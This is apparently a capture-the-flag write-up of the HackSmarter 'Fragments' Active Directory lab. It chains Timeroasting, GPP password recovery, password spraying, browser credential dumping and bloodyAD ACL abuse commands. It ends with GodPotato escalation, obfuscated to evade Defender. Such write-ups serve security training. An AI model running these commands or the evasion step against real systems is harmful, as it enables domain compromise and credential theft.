---
title: HackSmarter - Fragments
date: 2026-08-11
image: cover.png
tags: [HackSmarter, Hard, Windows, Active Directory]
excerpt: A HackSmarter hard Windows/Active Directory box that starts with nothing but an exposed NFS export and an NTP service. Timeroasting cracks a pre-staged machine account, which opens up domain recon, a Group Policy Preferences credential leak, and a spray to a first user. From there the path winds through browser-stored credentials, a chain of ACL abuses (write access, AS-REP roasting, ReadGMSAPassword, a logonHours fix, AddSelf and GenericAll), and finishes with a Defender-evading GodPotato SeImpersonate escalation to local administrator.
---

# Fragments

Fragments is a hard-rated Windows and Active Directory machine from HackSmarter, built on Windows Server 2025. There is no easy web foothold here - the entry point is an unauthenticated Timeroasting attack against the domain controller's NTP service, which recovers the password of a pre-staged machine account. That single machine account unlocks a long, ACL-driven chain: Group Policy Preferences credentials, a password spray, browser-stored secrets, and then a sequence of Active Directory abuses (write permissions, AS-REP roasting, ReadGMSAPassword, a logonHours fix, AddSelf, and GenericAll) that culminates in a Defender-evading GodPotato escalation to local administrator. Every credential, hash, and IP below belongs to the lab and is meaningless outside of it.

> [!NOTE] The target's IP changes partway through this write-up (from `10.1.61.38` to `10.1.204.197`) because the box was reset between sessions. Both refer to the same host, `DC01.fragments.local`.

## Unauthenticated Enumeration and Initial Access

### NMAP Scanning

A full port scan shows a domain controller with an unusual extra: an NFS server (portmapper on 111, NFS on 2049) sitting alongside the usual AD services. The embedded RDP certificate body has been trimmed below, since only its subject and validity matter for identifying the host.

```cpp
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-06 09:36:59Z)
111/tcp   open  rpcbind?      syn-ack ttl 126
| rpcinfo:
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: fragments.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
2049/tcp  open  nlockmgr      syn-ack ttl 126 1-4 (RPC #100021)
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: fragments.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.fragments.local
| Issuer: commonName=DC01.fragments.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-13T01:02:46
| Not valid after:  2027-01-12T01:02:46
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: FRAGMENTS
|   NetBIOS_Domain_Name: FRAGMENTS
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: fragments.local
|   DNS_Computer_Name: DC01.fragments.local
|   DNS_Tree_Name: fragments.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-06T09:37:56+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49723/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49739/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2026-08-06T09:37:56
|_  start_date: N/A
```

The hostname `DC01.fragments.local` and domain `fragments.local` come straight out of the RDP and LDAP service info.

### RPC Enumeration

Attempting a null-session RPC bind returns `NT_STATUS_ACCESS_DENIED`, which tells us anonymous RPC is locked down and we will need valid credentials to get anywhere over this channel:

{% image %}

### SMB - Banner Grabbing

{% image2 %}

SMB signing is enabled and required, which means the host is not vulnerable to NTLM relaying. This is the default on Windows Server 2025, which is exactly what we are dealing with here.

We can also add `fragments.local` to our `/etc/hosts` file:

```bash
10.1.61.38	DC01.fragments.local fragments.local
```

### SMB - NULL, Guest and Anonymous Authentication

Before assuming we are locked out, it is worth trying the three "free" authentication paths - a null session, the Guest account, and anonymous access - across SMB:

{% image3 %}

All three are denied, so there is no unauthenticated SMB foothold.

### LDAP Enumeration

First we can extract the naming contexts using `ldapsearch -x -H ldap://10.1.61.38 -s base namingcontexts`:

{% image4 %}

The base object is readable anonymously, but as soon as we try to pull anything more detailed we hit a bind error, confirming that meaningful LDAP enumeration also requires credentials:

{% image5 %}

### NFS Enumeration

The one service that stands out on an otherwise hardened DC is NFS. Port `2049` is open, and `showmount` reveals an exported mount point:

{% image6 %}

So let's create a folder called `incidents` and mount the export to inspect its contents:

→ Command: `sudo mount -t nfs -o vers=3 DC01.fragments.local:/incidents ./incidents`

{% image7 %}

Running `ls -ldn incidents` shows the directory is owned by a specific UID/GID rather than being world-readable:

{% image8 %}

NFS (in this version) trusts whatever UID the client presents, so we can simply create a local user with the matching UID and read the files as if we were the owner:

```bash
echo 'nfsanon:x:4294967294:4294967294::/tmp:/bin/bash' | sudo tee -a /etc/passwd
sudo -u nfsanon ls -lah incidents
```

{% image9 %}

The first log (`IR_20260122_ACC.log`) contains the following:

```bash
➜  fragments sudo -u nfsanon cat incidents/IR_20260122_ACC.log
==================================================
INCIDENT RESPONSE LOG - INTERNAL USE ONLY
==================================================
File: IR_20260122_ACC.log
Created: 2026-01-22 10:15:21 EST
Last Modified: 2026-01-22 10:15:21 EST
Case ID: IR-2026-0122
User: Administrator
Status: Under Investigation
Severity: MEDIUM (5.1/10)
==================================================

== INCIDENT SUMMARY ==
While updating a user account, I may have messed up one of the account attributes and now the account doesn't work.

== TIMELINE ==
2026-01-22: Under Investigation...
==================================================
```

This is a strong hint that later in the box we will need to fix a broken attribute on some account - most likely a `userAccountControl` flag or a logon restriction. Keep it in mind.

The second log (`IR_20260202_FRG0310.log`) points at a specific workstation, `FRG0310`:

```bash
➜  fragments sudo -u nfsanon cat incidents/IR_20260202_FRG0310.log
==================================================
INCIDENT RESPONSE LOG - INTERNAL USE ONLY
==================================================
File: IR_20260202_FRG0310.log
Created: 2026-02-02 09:14:22 EST
Last Modified: 2026-02-02 11:30:47 EST
Case ID: IR-2026-0022
System: FRG0310.fragments.local
User: Administrator
Agent: Built-in Windows Defender
Status: Under Investigation
Severity: MEDIUM (5.8/10)
Threat ID: DEFENDER-ALERT-7721
==================================================

== INCIDENT SUMMARY ==
Security alert triggered on workstation FRG0310 (Windows 11 Pro).
Detection: Unusual PowerShell script execution patterns.
Activity: Multiple failed authentication attempts from user session.
Impact: Local credential caching anomalies detected.
No external network communications observed.

== TIMELINE ==
2026-02-02 08:45:10 - Initial alert: PowerShell execution anomaly
2026-02-02 09:00:33 - Failed logon attempts from existing session
2026-02-02 09:14:22 - Investigation initiated
2026-02-02 10:15:00 - System isolated for analysis

== RECOMMENDED ACTIONS ==
1. Review authentication logs
2. Check for local privilege escalation
3. Reset local Administrator account
4. Scan for persistence mechanisms
==================================================%
```

The name `FRG0310` is the useful takeaway here - it tells us a workstation account, `FRG0310$`, exists in the domain, which becomes relevant almost immediately.

### AS-REP Roasting and pre2k Attempts

With a computer account name in hand, the first thing to try is AS-REP roasting it, but nothing comes back:

{% image10 %}

A pre2k (pre-Windows 2000 default machine password) attack also fails with `STATUS_LOGON_FAILURE` across every variation:

{% image11 %}

### Timeroasting - Abusing NTP Authentication

That leaves one more unauthenticated technique worth trying before giving up: Timeroasting. Windows domain controllers answer NTP time-sync requests with a message authentication code that is keyed on the RC4 hash of the requesting computer account's password - and they will do this for any RID, with no authentication from the requester. That means we can ask the DC for a signed time sample per computer account and crack the resulting MAC offline. Machine account passwords are normally random and effectively uncrackable, but accounts that were pre-staged with a weak password (as is the case here) fall quickly. Because it needs no credentials at all, it is an excellent last resort once null and guest access are locked down.

NetExec can perform the collection directly:

{% image12 %}

To crack the hashes we use [timecrack.py](https://github.com/bvcyber/Timeroast/blob/main/extra-scripts/timecrack.py), but running it as-is throws `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte`, because `rockyou.txt` contains raw bytes from old password dumps that are not valid UTF-8. Reading the dictionary as latin-1 fixes it:

```bash
argparser.add_argument('dictionary', type=FileType('r', encoding='latin-1'), help='Line-delimited password dictionary')
```

With that change in place, the script cracks one of the hashes:

→ Command: `python3 timecrack.py ntp_hashes.hash /usr/share/wordlists/rockyou.txt`

{% image13 %}

Testing the recovered password over SMB for the `FRG0310$` account confirms it is valid - our first working set of credentials:

{% image14 %}

## Domain Reconnaissance as FRG0310$

### Collecting BloodHound Data over Kerberos

Machine accounts behave like normal accounts for most authenticated operations, so we can use `FRG0310$` to collect BloodHound data over LDAP:

{% image15 %}

The first attempt fails with an "invalid credentials" error, which is misleading. We are using a machine account (`FRG0310$`), and RustHound-CE authenticates with an **LDAP simple bind**, which AD treats as a network-cleartext logon. Machine accounts are not permitted that logon type. NetExec's LDAP module binds over NTLM/SASL instead, which machine accounts *are* allowed to do - hence the green `[+]` we saw earlier.

We can work around this by authenticating with Kerberos, which first means requesting a TGT:

{% image16 %}

With the ticket in place, `rusthound-ce -d fragments.local -f DC01.fragments.local -i 10.1.61.38 -n 10.1.61.38 -k -c All -z` collects successfully:

{% image17 %}

### Group Policy Preferences - Groups.xml

Machine account access also lets us read SYSVOL, so we check for the classic Group Policy Preferences credential leak using NetExec's `gpp_password` module:

{% image18 %}

The `Groups.xml` file lives at `fragments.local/Policies/{EDFFE4E4-762D-47E5-85E7-B52950A90149}/Machine/Preferences/Groups/Groups.xml`. Files like this can contain a `cpassword` attribute - an AES-encrypted password whose static decryption key Microsoft published years ago, making it trivially recoverable:

{% image19 %}

### Password Spraying to c.white

The description field of the GPP file leaks a password. To spray it, we first need a list of usernames, which we can gather with NetExec's `--users` flag or - to be sure we also capture machine accounts - with `ldapsearch` using the TGT we generated earlier:

```bash
ldapsearch \
    -H ldap://10.1.61.38 \
    -Y GSSAPI \
    -b "dc=fragments,dc=local" \
    "(objectClass=*)"
```

Then we grep for the `sAMAccountName` field to build the user list:

{% image20 %}

Spraying the leaked password across those users produces two interesting results:

{% image21 %}

We get a valid hit on the `c.white` user, and a `STATUS_ACCOUNT_RESTRICTION` on the `shareadmin` account (the correct password, but authentication is blocked by a policy restriction).

## Foothold: c.white (User Flag)

### BloodHound - c.white's Access

Checking c.white's group memberships in BloodHound shows the account is in **REMOTE MANAGEMENT USERS**, which means we can connect over WinRM:

{% image22 %}

Its outbound write permissions, however, show nothing useful - only self-write style entries:

```bash
➜  fragments bloodyAD -d fragments.local -i 10.1.61.38 -u 'c.white' -p 'ESwXHXweG!' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fragments,DC=local
permission: WRITE

distinguishedName: CN=Chris CW. White,CN=Users,DC=fragments,DC=local
permission: WRITE
```

Connecting with `evil-winrm` lands us a shell and the user flag:

→ Command: `evil-winrm -i 10.1.61.38 -u 'c.white' -p 'ESwXHXweG!'`

{% image23 %}

### c.white - Dumping Opera GX Browser Data

Standard privilege escalation tooling (WinPEAS, PrivescCheck) turns up nothing, so we fall back to enumerating the user's home directory for anything interesting:

{% image24 %}

Under `AppData\Roaming` there is a profile folder for the Opera GX browser:

{% image25 %}

Since this is a browser, we can use [HackBrowserData](https://github.com/moonD4rk/HackBrowserData) to extract its saved bookmarks, cookies, and credentials:

{% image26 %}

The `-b` flag specifies the target browser, `-d` the output directory, and `-p` the profile path.

Inside the extracted `bookmark.json` there is a notable entry for `passwordmgmt.fragments.local`:

{% image27 %}

That bookmark holds a base64 blob, which we can decode with CyberChef:

{% image28 %}

The decoded data contains usernames and passwords, so we take them and test them over SMB with NetExec:

{% image29 %}

## Lateral Movement: j.woods to o.rodrigo

### Triaging the Recovered Accounts

One of the recovered accounts is valid, but `d.goggins` returns `STATUS_INVALID_LOGON_HOURS` - the credentials are correct, but AD's `logonHours` attribute currently forbids the account from authenticating. This is very likely the "broken account" referenced in the first incident log, so we park it for now and come back once we can edit that attribute.

Checking `j.woods` in BloodHound shows nothing interesting in terms of group memberships or user rights:

{% image30 %}

So instead we check, with bloodyAD, whether the account has any write permissions over other objects:

{% image31 %}

It turns out `j.woods` has write access over `Olivia OR. Rodrigo`. Resolving that object with `bloodyAD --host DC01.fragments.local -d fragments.local -u 'j.woods' -p 'hpFqULtQoY!' -i 10.1.204.197 get object 'CN=Olivia OR. Rodrigo,CN=Users,DC=fragments,DC=local'` shows the account is `o.rodrigo`:

{% image32 %}

### Enabling o.rodrigo for AS-REP Roasting

Looking at o.rodrigo in BloodHound, this account has `ReadGMSAPassword` over the `PROD$` gMSA - a clear onward path, if we can authenticate as it:

{% image33 %}

There is a catch: the account is disabled. Because our write access covers `userAccountControl`, we can both clear the `ACCOUNTDISABLE` flag to re-enable it and set `DONT_REQ_PREAUTH` to make it AS-REP roastable, avoiding the need to know its password at all:

{% image34 %}

Removing the `ACCOUNTDISABLE` flag:

```bash
bloodyAD --host DC01.fragments.local -d fragments.local -u 'j.woods' -p 'hpFqULtQoY!' -i 10.1.204.197 remove uac o.rodrigo -f ACCOUNTDISABLE
```

{% image35 %}

Now setting the `DONT_REQ_PREAUTH` flag:

```bash
bloodyAD --host DC01.fragments.local -d fragments.local -u 'j.woods' -p 'hpFqULtQoY!' -i 10.1.204.197 add uac o.rodrigo -f DONT_REQ_PREAUTH
```

{% image36 %}

With both flags set, the account is enabled and AS-REP roastable.

### AS-REP Roasting - o.rodrigo

Requesting the AS-REP for o.rodrigo now returns a roastable hash:

{% image37 %}

We take that hash and crack it with hashcat:

{% image38 %}

The password is `nohacking!`, which we confirm with a quick SMB query:

{% image39 %}

## Privilege Escalation to SHAREDADMIN

### ReadGMSAPassword Abuse - PROD$

Now that we can authenticate as o.rodrigo, we can read the gMSA password for the `PROD$` account:

```bash
bloodyAD --host DC01.fragments.local -d fragments.local -u 'o.rodrigo' -p 'nohacking!' -i 10.1.204.197 get object 'PROD$' --attr msDS-ManagedPassword
```

{% image40 %}

As before, we validate the recovered NT hash with a simple SMB query:

{% image41 %}

BloodHound shows nothing obvious for `PROD$`, so we go back to bloodyAD to check its write permissions directly:

{% image42 %}

Using `--detail` to see exactly what is writable, we find that `PROD$` can modify `logonHours`:

{% image43 %}

This is precisely what we need to fix the earlier `STATUS_INVALID_LOGON_HOURS` on `d.goggins` - resetting its `logonHours` so the account can authenticate at any time:

```bash
bloodyAD --host DC01.fragments.local -d fragments.local -u 'PROD$' -p ':b43cb2fcadff72ff9136a2f42218c430' -i 10.1.204.197 set object d.goggins logonHours
```

{% image44 %}

### PROD$ - Fixing d.goggins' Logon Hours

With `d.goggins` able to authenticate again, BloodHound reveals its escalation path: the account can add itself to the `ADMINACCS` group:

{% image45 %}

And membership of `ADMINACCS` grants `GenericAll` over the `SHAREDADMIN` user:

{% image46 %}

The complication is that `SHAREDADMIN` is a member of the **PROTECTED USERS** group, which means the account cannot authenticate with NTLM at all. We can work around that later by requesting a Kerberos TGT for it instead of passing its hash.

### AddSelf and GenericAll Abuse

First, `d.goggins` adds itself to `ADMINACCS`:

```bash
bloodyAD --host DC01.fragments.local -d fragments.local -u 'd.goggins' -p 'HiO5n449W36!' -i 10.1.204.197 add groupMember 'adminaccs' 'd.goggins'
```

{% image47 %}

Now that we are in the group, the `GenericAll` over `SHAREDADMIN` lets us reset its password outright:

```bash
bloodyAD --host DC01.fragments.local -d fragments.local -u 'd.goggins' -p 'HiO5n449W36!' -i 10.1.204.197 set password 'SHAREDADMIN' 'Password123!'
```

{% image48 %}

## Local Administrator via GodPotato

### SHAREDADMIN - Reaching SeImpersonate via IIS_IUSRS

With control of `SHAREDADMIN`, the final objective is local administrator (or Domain Admin) on the DC. Checking this account's outbound permissions shows a large number of `GenericAll` entries over various groups:

{% image49 %}

The most useful of these is `IIS_IUSRS`, because every member of that group is granted `SeImpersonatePrivilege` - the exact privilege a potato-style attack needs. Since we already have WinRM access as `c.white`, we add that account to the group:

{% image50 %}

A quick `whoami /priv` confirms that `SeImpersonatePrivilege` is now enabled in our c.white session:

{% image51 %}

### Bypassing Defender and Running GodPotato

Uploading GodPotato and executing it fails immediately - Defender flags the binary as malware:

{% image52 %}

There are two reasonable ways around this:

1. Obfuscate the GodPotato binary so it is no longer signatured as malware.
2. Get a C2 callback in Adaptix, Sliver, or another framework and load the .NET assembly in memory with `execute-assembly`.

We will take the first option. On a Windows dev machine we clone GodPotato and strip out all of the comments:

{% image53 %}

Then we save the solution (`CTRL + S`) and run it through [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) to obfuscate the .NET project:

{% image54 %}

Rebuilding the solution and transferring the new `.exe` to the target, the binary now runs past Defender:

{% image55 %}

With SYSTEM-level execution in hand, we grab the final flag:

{% image56 %}

Fragments earns its hard rating not through any single difficult exploit but through the length and variety of its chain. It rewards patient enumeration (the NFS export and the NTP service are easy to overlook) and a willingness to switch tooling when one approach hits a wall - the machine-account LDAP bind quirk, the Protected Users restriction, and the Defender detection each force a small change of tactics rather than a change of goal. Timeroasting as an unauthenticated entry point and the long ACL-abuse ladder to `SHAREDADMIN` make it a genuinely instructive box.
